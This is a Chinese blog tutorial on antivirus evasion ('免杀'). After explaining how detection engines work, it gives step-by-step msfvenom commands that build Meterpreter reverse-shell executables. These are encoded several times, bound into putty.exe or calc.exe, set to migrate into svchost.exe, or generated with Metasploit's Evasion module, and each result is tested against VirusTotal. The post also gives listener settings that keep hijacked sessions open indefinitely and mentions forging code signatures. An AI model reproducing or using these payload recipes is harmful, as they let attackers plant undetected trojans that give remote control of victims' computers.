---

layout:     post               # 使用的布局（不需要改）
title:      免杀之基础篇  # 标题 
subtitle:       #副标题
date:       2020-10-29         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               

    - 免杀

---

## 一、恶意软件

病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索病毒、广告程序。

在用户非自愿的情况下执行安装。

出于某种恶意目的：控制、窃取、勒索、偷窥、推送、攻击。

## 二、防病毒软件

* 恶意程序最主要的防护手段

  杀毒软件/防病毒如那件

  客户端/服务器/邮件防病毒

* 检测原理

  基于二进制文件中特征签名的黑名单检测方法

  基于行为的分析方法（启发式）

* 事后手段

  永远落后于病毒发展

## 三、免杀技术

* 修改二进制文件中的特征字符

  替换、擦除、修改

* 加密技术（crypter）

  通过加密使得特征字符不可读，从而逃避AV检测

  运行时分片分段的解密执行，注入进程或AV 不检查的无害文件中

* 防病毒软件的检测

  恶意程序本身的特征字符

  加密器crypter 的特征字符

## 四、当前现状

* 恶意软件制造者

  编写私有 RAT 软件，避免普遍被 AV 所知的特征字符

  使用独有 crypter 软件加密恶意程序

  处事低调，尽量避免被发现

  没有能力自己编写的恶意代码的黑客，通过直接修改特征码的方式免杀。

  Fully UnDetectable 是最高追求（FUD）

* AV 厂商

  广泛采集样本，尽快发现新出现的恶意程序，更新病毒库。

  一般新的恶意软件安全 UD 窗口期是一周左右。

  与·恶意软件制造者永无休止的拉锯战。

  新的启发式检测技术尚有待完善（误杀漏杀）。

* 单一 AV 厂商的病毒库很难达到100%覆盖

  * https://www.virustotal.com/gui/

    接口被某些国家的AV软件免费利用，没有自己的病毒库。

  * https://www.virscan.org/

  * 在线多引擎查杀网站与 AV 厂商共享信息

  * 搞黑的在线多引擎查毒站

    * https://nodistribute.com/
    * http://viruscheckmate.com/check/

* 常用的 RAT 软件

  灰鸽子、波尔、黑暗彗星、潘多拉、Nanocore



1. 生成反弹 shell

   ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.215 LPORT=4444 -a x86 --platform windows -f exe -o 1.exe
   ```

   [![BMb84U.md.png](https://s1.ax1x.com/2020/10/27/BMb84U.md.png)](https://imgchr.com/i/BMb84U)

2. 加密编译反弹·shell

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.216 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown - i 8 - f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b '\x00' -f exe -o 2.exe
   ```

   编码后的木马可能反弹不了shell.

   `string 1.exe` 查看二进制可显示字符。

   在线杀毒网站一检测会反弹shell的特征就会被检测。

3. 利用模板隐藏 shell

   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.215 LPORT=4444 -x /root/msf/miansha/calc.exe -k -e cmd/powershell_base64 -i 5 -f exe -o 4.exe
   ```

   * -e <encoders>  指定编码器
   * -i    编码次数
   * -x    指定模板
   * -k   保留模板原有功能，将payload作为一个新的线程来注入，但不能保证可以用在所有可执行程序上。

   [![BMbE4S.md.png](https://s1.ax1x.com/2020/10/27/BMbE4S.md.png)](https://imgchr.com/i/BMbE4S)

 可以看到被检测为后门的数量降低了，说明还是有一点效果的。

## 六、杀毒软件检测方式

#### 6.1 杀毒常见扫描方式

> 1、扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术。
>
> 2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑。
>
> 3、修复技术：即是对恶意程序所损坏的文件进行还原
>
> 4、急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒。
>
> 5、智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短。
>
> 6、全盘扫描：扫描电脑全部磁盘，耗时较长。
>
> 7、勒索软件防护：保护电脑中的文件不被黑客恶意加密。
>
> 8、开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序

#### 6.2 监控技术

> 1、内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控读取到内存中的文件；监控读取到内存的网络数据。
>
> 2、文件监控：当发现写到磁盘上的文件中存在病毒，或者是被病毒感染，就会主动报警。
>
> 3、邮件监控：当发现电子邮件的附件存在病毒时进行拦截。
>
> 4、网页防护：阻止网络攻击和不安全下载。
>
> 5、行为防护：提醒用户可疑的应用程序行为。

##  七、扫描引擎

#### 7.1 特征码扫描

机制：将扫描信息与病毒数据库（即所谓的“病毒特征库”）进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不大可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。

特征码类别：1.文件特征码：对付病毒在文件中的存在方式：单一文件特征码、复合文件特征码（通过多处特征进行判断）；

2.内存特征码：对付病毒在内存中的存在方式：单一内存特征码、复合内存特征码

优点：速度快，配备高性能的扫描引擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。

缺点：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏，给用户带来麻烦。

#### 7.2 文件校验和法

对文件进行扫描后，可以将正常文件的内容，计算其校验和，将该校验和写入文件中或写入别的文件中保存；在文件使用过程中，定期地或每次使用文件前，检查文件现在内容算出的校验和与原来保存的校验和是否一致，因而可以发现文件是否感染病毒。

#### 7.3 进程行为监测法（沙盒模式）

机制：通过对病毒多年的观察、研究，有一些行为是病毒的共同行为，而且比较特殊，在正常程序中，这些行为比较罕见。比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。当程序运行时，监视其进程的各种行为，如果发现了病毒行为，立即报警。

优缺点：

1.优点：可发现未知病毒、可相当准确地预报未知的多数病毒； 

2.缺点：可能误报警、不能识别病毒名称、有一定实现难度、需要更多的用户参与判断；

针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。

#### 7.4 云查杀

云查杀的特点基本也可以概括为特征查杀，杀软会将较可疑但特征库并没有响应特征的程序传回杀软公司服务器上，进而判断该程序是否为恶意程序，然后做出响应。所以当你开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了，这就是云查杀的效果。

#### 7.5 主动防御技术

主动防御并不需要病毒特征码支持，只要杀毒软件能分析并扫描到目标程序的行为，并根据预先设定的规则，判定是否应该进行清除操作  主动防御本来想领先于病毒，让杀毒软件自己变成安全工程师来分析病毒，从而达到以不变应万变的境界。但是，计算机的智能总是在一系列的规则下诞生，而普通用户的技术水平达不到专业分析病毒的水平，两者之间的博弈需要主动防御来平衡。

#### 7.6 机器学习识别技术

机器学习识别技术既可以做静态样本的二进制分析，又可以运用在沙箱动态行为分析当中，是为内容/行为+算法模式。伴随着深度学习的急速发展，各家厂商也开始尝试运用深度学习技术来识别病毒特征，如瀚思科技的基于深度学习的二进制恶意样本检测。

## 八、免杀技术发展史

理论上讲，免杀一定是出现在杀毒软件之后的。而通过杀毒软件的发展史不难知道，第一款杀毒软件kill  1.0是Wish公司1987年推出的，也就是说免杀技术至少是在1989年以后才发展起来的。关于世界免杀技术的历史信息已无从考证，但从国内来讲，免杀技术的起步可以说是非常晚了。

1989年：第一款杀毒软件Mcafee诞生，标志着反病毒与反查杀时代的到来。

1997年：国内出现了第一个可以自动变异的千面人病毒（Polymorphic/Mutation Virus）。自动变异就是病毒针对杀毒软件的免杀方法之一，但是与免杀手法的定义有出入。

2002年7月31日：国内第一个真正意义上的变种病毒“中国黑客II”出现，它除了具有新的特征之外，还实现了“中国黑客”第一代所未实现的功能，可见这个变种也是病毒编写者自己制造的。

2004年：在黑客圈子内部，免杀技术是由黑客动画吧在这一年首先公开提出，由于当时还没有CLL等专用免杀工具，所以一般都使用WinHEX逐字节更改。

2005年1月：大名鼎鼎的免杀工具CCL的软件作者tankaiha在杂志上发表了一篇文章，藉此推广了CCL，从此国内黑客界才有了自己第一个专门用于免杀的工具。

2005年2月-7月：通过各方面有意或无意的宣传，黑客爱好者们开始逐渐重视免杀，在类似于免杀技术界的祖师爷黑吧安全网的浩天老师带领下一批黑客开始有越来越多的讨论免杀技术，这为以后木马免杀的火爆埋下根基。

2005年08月：第一个可查的关于免杀的动画由黑吧的浩天老师完成，为大量黑客爱好者提供了一个有效的参考，成功地对免杀技术进行了第一次科普。

2005年09月：免杀技术开始真正的火起来。

由上面的信息可见，国内在1997年出现了第一个可以自动变异的千面人病毒，虽然自动变异也可以看为是针对杀毒软件的一种免杀方法，但是由于与免杀手法的定义有出入，所以如果将国内免杀技术起源定位1997年会显得比较牵强。

一直等到2002年7月31日，国内第一个真正意义上的变种病毒“中国黑客II”才迟迟出现，因此我们暂且可以将国内免杀技术的起源定位在2002年7月。

## 九、免杀技术介绍

#### 9.1 修改特征码

免杀的基本思想就是破坏特征，这个特征有可能是特征码，有可能是行为特征，只要破坏了病毒和木马所固有的特征，并保证其原有功能没有改变，一次免杀就完成了。

```
特征码：能识别一个程序是一个病毒的一段不大于64字节的特征码。
```

就目前的反病毒技术来讲，更改特征码从而达到免杀的效果事实上包含着两种方式。

一种是改特征码，这也是免杀的最初方法。例如一个文件在某一个地址内有“灰鸽子上线成功！”这么一句话，表明它就是木马，只要将相应地址内的那句话改成别的就可以了，如果是无关痛痒的，直接将其删掉也未尝不可。

第二种是针对目前推出的校验和查杀技术提出的免杀思想，它的原理虽然仍是特征码，但是已经脱离纯粹意义上特征码的概念，不过万变不离其宗。其实校验和也是根据病毒文件中与众不同的区块计算出来的，如果一个文件某个特定区域的校验和符合病毒库中的特征，那么反病毒软件就会报警。所以如果想阻止反病毒软件报警，只要对病毒的特定区域进行一定的更改，就会使这一区域的校验和改变，从而达到欺骗反病毒软件的目的。

修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。

#### 9.2 花指令免杀

花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。

大多数反病毒软件是靠特征码来判断文件是否有毒的，而为了提高精度，现在的特征码都是在一定偏移量限制之内的，否则会对反病毒软件的效率产生严重的影响！而在黑客们为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，自然也就无法正常检测木马了。

#### 9.3 加壳免杀

说起软件加壳，简单地说，软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。

当我们运行这个加壳的程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。这样一来，在我们看来，似乎加壳之后的程序并没有什么变化，然而它却达到了加密的目的，这就是壳的作用。

加壳虽然对于特征码绕过有非常好的效果，加密壳基本上可以把特征码全部掩盖，但是缺点也非常的明显，因为壳自己也有特征。在某些比较流氓的国产杀软的检测方式下，主流的壳如VMP, Themida等，一旦被检测到加壳直接弹框告诉你这玩意儿有问题，虽然很直接，但是还是挺有效的。有些情况下，有的常见版本的壳会被直接脱掉分析。  面对这种情况可以考虑用一些冷门的加密壳，有时间精力的可以基于开源的压缩壳改一些源码，效果可能会很不错。

总得来说，加壳的方式来免杀还是比较实用的，特别是对于不开源的PE文件，通过加壳可以绕过很多特征码识别。

#### 9.4 内存免杀

CPU不可能是为某一款加壳软件而特别设计的，因此某个软件被加壳后的可执行代码CPU是读不懂的。这就要求在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。

因为杀毒软件的内存扫描原理与硬盘上的文件扫描原理都是一样的，都是通过特征码比对的，只不过为了制造迷惑性，大多数反病毒公司的内存扫描与文件扫描采用的不是同一套特征码，这就导致了一个病毒木马同时拥有两套特征码，必须要将它们全部破坏掉才能躲过反病毒软件的查杀。

因此，除了加壳外，黑客们对抗反病毒软件的基本思路没变。而对于加壳，只要加一个会混淆程序原有代码的“猛”壳，其实还是能躲过杀毒软件的查杀的。

#### 9.5 二次编译

metasploit的msfvenom提供了多种格式的payload和encoder，生成的shellcode也为二次加工提供了很大遍历，但是也被各大厂商盯得死死的。

而shikata_ga_nai是msf中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样。还可以利用管道进行多重编码进行免杀。

目前msfvenom的encoder特征基本都进入了杀软的漏洞库，很难实现单一encoder编码而绕过杀软，所以对shellcode进行进一步修改编译成了msf免杀的主流。互联网上有很多借助于C、C#、python等语言对shellcode进行二次编码从而达到免杀的效果。

#### 9.6 分离免杀

侯亮大神和倾旋大神都分别提到过payload分离免杀和webshell分离免杀，采用分离法，即将ShellCode和加载器分离。网上各种加载器代码也有很多，各种语言实现的都很容易找到，虽然看起来比较简单，但效果却是不错的。比如侯亮大神提到的shellcode_launcher，加载c代码，基本没有能查杀的AV。

#### 9.7 资源修改

有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。

1.加资源

使用ResHacker对文件进行资源操作，找来多个正常软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等。

2.替换资源

使用ResHacker替换无用的资源（Version等）。

3.加签名

使用签名伪造工具，将正常软件的签名信息加入到自己软件中。

## 十、Metasploit 自带免杀

Metasploit自身已经提供了一定免杀机制，比如Evasion模块、MSF自带的C编译模块、大名鼎鼎的shikata_ga_nai编码等等，但由于msf被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果。

#### 10.1 msfvenom

msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。

`msfvenom` 部分参数：

```bash
-p, –payload < payload> 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的

-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all

-n, –nopsled < length> 为payload预先指定一个NOP滑动长度

-f, –format < format> 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)

-e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload

-a, –arch < architecture> 指定payload的目标架构，例如x86 | x64 | x86_64

–platform < platform> 指定payload的目标平台

-s, –space < length> 设定有效攻击荷载的最大长度，就是文件大小

-b, –bad-chars < list> 设定规避字符集，指定需要过滤的坏字符例如：不使用 '\x0f'、'\x00';

-i, –iterations < count> 指定payload的编码次数

-c, –add-code < path> 指定一个附加的win32 shellcode文件

-x, –template < path> 指定一个自定义的可执行文件作为模板,并将payload嵌入其中

-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行

–payload-options 列举payload的标准选项

-o, –out < path> 指定创建好的payload的存放位置

-v, –var-name < name> 指定一个自定义的变量，以确定输出格式

–shellest 最小化生成payload

-h, –help 查看帮助选项

–help-formats 查看msf支持的输出格式列表
```

比如想查看 `windows/meterpreter/reverse_tcp` 支持什么平台，哪些选项，可以使用 `msfvenom -p windows/meterpreter/reverse_tcp --list-options` 

 ```bash
root@localhost:~# msfvenom -p windows/meterpreter/reverse_tcp --list-options
Options for payload/windows/meterpreter/reverse_tcp:
=========================


       Name: Windows Meterpreter (Reflective Injection), Reverse TCP Stager
     Module: payload/windows/meterpreter/reverse_tcp
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 283
       Rank: Normal

Provided by:
    skape <mmiller@hick.org>
    sf <stephen_fewer@harmonysecurity.com>
    OJ Reeves
    hdm <x@hdm.io>

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST                      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port

Description:
  Inject the meterpreter server DLL via the Reflective Dll Injection 
  payload (staged). Connect back to the attacker



Advanced options for payload/windows/meterpreter/reverse_tcp:
=========================

    Name                         Current Setting  Required  Description
    ----                         ---------------  --------  -----------
    AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
    AutoRunScript                                 no        A script to run automatically on session creation.
    AutoSystemInfo               true             yes       Automatically capture system information on initialization.
    AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process
    AutoVerifySession            true             yes       Automatically verify and drop invalid sessions
    AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
    EnableStageEncoding          false            no        Encode the second stage payload
    EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
    HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
    InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
    PayloadBindPort                               no        Port to bind reverse tcp socket to on target system.
    PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
    PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
    PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
    PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
    PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
    PingbackRetries              0                yes       How many additional successful pingbacks
    PingbackSleep                30               yes       Time (in seconds) to sleep between pingbacks
    PrependMigrate               false            yes       Spawns and runs shellcode in new process
    PrependMigrateProc                            no        Process to spawn and run shellcode in
    ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
    ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system
    ReverseListenerBindPort                       no        The port to bind to on the local system if different from LPORT
    ReverseListenerComm                           no        The specific communication channel to use for this listener
    ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
    SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
    SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
    SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
    SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
    StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
    StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is set
    StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
    StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails
    StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts
    VERBOSE                      false            no        Enable detailed status messages
    WORKSPACE                                     no        Specify the workspace for this module

Evasion options for payload/windows/meterpreter/reverse_tcp:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------

 ```

使用`msfvenom --list payloads`可查看所有payloads

使用`msfvenom --list encoders`可查看所有编码器.

```bash
root@localhost:~# msfvenom -le

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder

```

#### 10.2 几个重要的监听参数

* 防止假session

  在实战中，经常会遇到假session或者刚连接就断开的情况，这里补充一些监听参数，防止假死与假session。

  ```msf
  msf exploit(multi/handler) > set ExitOnSession false   //可以在接收到seesion后继续监听端口，保持侦听。
  ```

* 防止 session 意外退出

  ```bash
  msf5 exploit(multi/handler) > set SessionCommunicationTimeout 0  //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0
  
  msf5 exploit(multi/handler) > set SessionExpirationTimeout 0 //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭
  ```

* handler 后台持续监听

  ```bash
  msf exploit(multi/handler) > exploit -j -z
  ```

  使用`exploit -j -z`可在后台持续监听,-j为后台任务，-z为持续监听，使用Jobs命令查看和管理后台任务。`jobs -K`可结束所有任务。

  还有种比较快捷的建立监听的方式，在msf下直接执行：

  ```bash
  msf5 > handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp
  ```

* payload 可持续化

  一般来说使用msfvenom生成的payload会单独开启一个进程，这种进程很容易被发现和关闭（在任务管理器），在后期想做持久化的时候只能再使用`migrate`进行。

  其实在生成payload时可直接使用如下命令，生成的payload会直接注入到指定进程中。

  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o  shell.exe
  ```

  生成的shell程序执行后会启动两个进程`shell.exe`和`svchost.exe`，关闭其中一个不会影响会话状态。唯一美中不足的是`svchost.exe`不是`system32`目录下的.

  在上面的生成payload参数中：

  （1）PrependMigrate=true `PrependMigrateProc=svchost.exe` 使这个程序默认会迁移到svchost.exe进程，自己测试的时候不建议到这个进程而是其他的持久进程。

  （2）使用-p指定使用的攻击载荷模块，使用-e指定使用x86/shikata_ga_nai编码器，使用-f选项告诉MSF编码器输出格式为exe，-o选项指定输出的文件名为payload.exe，保存在根目录下。

#### 10.3 原生态payload（46/71）

生成原始 payload 做样本。

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.131 LPORT=4444 -f exe -o 1.exe`

[![B8YRgJ.md.png](https://s1.ax1x.com/2020/10/28/B8YRgJ.md.png)](https://imgchr.com/i/B8YRgJ)

可以看到 	vt 查杀率  46/71 .

火绒秒杀。

#### 10.4 msf 自编码免杀（56/71）

metasploit提供了多个encoders可以对payload进行处理，使用msfvenom --list encoders可查看所有编码器。

评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器了。

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.131 LPORT=4444  -e x86/shikata_ga_nai -b "\x00" -i 15 -f exe -o 2.exe`

[![B8UGAx.md.png](https://s1.ax1x.com/2020/10/28/B8UGAx.md.png)](https://imgchr.com/i/B8UGAx)

在virustotal.com上查杀率为56/71。

火绒秒杀。

由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。

#### 10.5 msf 自带捆绑免杀（45/65）

在生成payload 可使用捆绑功能，使用 -x 参数。

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.131 LPORT=4444 -x putty.exe -k  -f exe -o 3.exe
```

![image-20201029001741173](C:%5CUsers%5C51946%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201029001741173.png)

VT查杀率45/65  ,免杀率提高了。

火绒也秒杀。

#### 10.6 msf 自捆绑+编码

将上面的编码和捆绑两种方法结合一下进行尝试

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.131 LPORT=4444 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o 4.exe`

#### 10.7 msf 多重编码（49/71）

msfvenom的encoder编码器可以对payload进行一定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。

如下命令，使用管道让msfvenom对攻击载荷多重编码，先用shikata_ga_nai编码20次，接着来10次的alpha_upper编码，再来10次的countdown编码，最后才生成以putty.exe为模板的可执行文件。

` msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.2.131 LPORT=4444 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -a x86 --platform windows  -x putty.exe -f exe -o 5.exe` 

[![B8D65n.md.png](https://s1.ax1x.com/2020/10/29/B8D65n.md.png)](https://imgchr.com/i/B8D65n)

VT免杀率49/71.。火绒秒杀。

免杀率也没提高多少，甚至有时候会减低。

是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。

#### 10.8 evasion 模块免杀（21/61）

2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。

```bash
msf5 > show evasion

evasion
=======

   #  Name                                         Disclosure Date  Rank    Check  Description
   -  ----                                         ---------------  ----    -----  -----------
   0  windows/applocker_evasion_install_util                        manual  No     Applocker Evasion - .NET Framework Installation Utility
   1  windows/applocker_evasion_msbuild                             manual  No     Applocker Evasion - MSBuild
   2  windows/applocker_evasion_presentationhost                    manual  No     Applocker Evasion - Windows Presentation Foundation Host
   3  windows/applocker_evasion_regasm_regsvcs                      manual  No     Applocker Evasion - Microsoft .NET Assembly Registration Utility
   4  windows/applocker_evasion_workflow_compiler                   manual  No     Applocker Evasion - Microsoft Workflow Compiler
   5  windows/windows_defender_exe                                  manual  No     Microsoft Windows Defender Evasive Executable
   6  windows/windows_defender_js_hta                               manual  No     Microsoft Windows Defender Evasive JS.Net and HTA

```



使用`use windows/windows_defender_exe`进行生成payload

```bash
msf5 > use windows/windows_defender_exe
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 evasion(windows/windows_defender_exe) > show options 

Module options (evasion/windows/windows_defender_exe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  Hmotkr.exe       yes       Filename for the evasive file (default: random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.2.131    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Evasion target:

   Id  Name
   --  ----
   0   Microsoft Windows
msf5 evasion(windows/windows_defender_exe) > exploit 

[*] Compiled executable size: 3584
[+] Hmotkr.exe stored at /root/.msf4/local/Hmotkr.exe

```

[![B8sEf1.md.png](https://s1.ax1x.com/2020/10/29/B8sEf1.md.png)](https://imgchr.com/i/B8sEf1)

VT免杀率44/71。 火绒秒杀。

使用 `windows/windows_defender_js_hta` 生成

```bash
msf5 > use evasion/windows/windows_defender_js_hta 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 evasion(windows/windows_defender_js_hta) > show options 

Module options (evasion/windows/windows_defender_js_hta):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  azUXtL.hta       yes       Filename for the evasive file (default: random)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
